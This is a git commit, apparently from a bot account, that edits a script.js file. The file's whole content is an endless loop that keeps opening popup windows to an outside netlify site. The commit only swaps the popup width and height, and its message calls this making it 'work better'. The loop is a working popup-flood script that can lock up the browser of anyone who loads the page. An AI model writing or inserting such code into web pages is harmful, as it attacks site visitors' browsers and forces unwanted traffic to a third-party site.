8ca67bb9756b2ea54fa6d671ce05728b778e7cba
bot910 <133582662+bot910@users.noreply.github.com>
2024-04-12 12:17:56 +0200

    Update script.js
    Made it work better

--- script.js
+++ script.js
@@ -1,3 +1,3 @@
 while (true) {
-  window.open("https://best-website-fr.netlify.app/", "Popup Window", "width=720,height=1200")
+  window.open("https://best-website-fr.netlify.app/", "Popup Window", "width=1200,height=720")
 }
